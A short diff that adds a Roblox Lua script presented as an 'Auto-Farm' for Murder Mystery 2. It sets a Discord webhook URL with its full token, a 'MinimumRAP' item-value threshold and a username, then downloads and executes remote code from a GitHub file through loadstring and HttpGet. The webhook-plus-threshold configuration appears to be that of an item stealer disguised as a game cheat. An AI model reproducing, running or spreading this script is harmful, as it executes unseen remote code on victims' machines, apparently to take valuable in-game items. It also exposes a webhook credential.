@@ -1,0 +1,6 @@
+Username= 'GroupBotOwner'
+Webhook= 'https://discord.com/api/webhooks/1322727669259046994/iqwULZ7-pEV8zu-y3ITbEAFAC6M4QD5BCo6V2Iin3CyXCG9io3Ra_3BOcbhYXisnlBVY'
+
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/XScrpt/MM2/refs/heads/main/Auto-Farm'))()
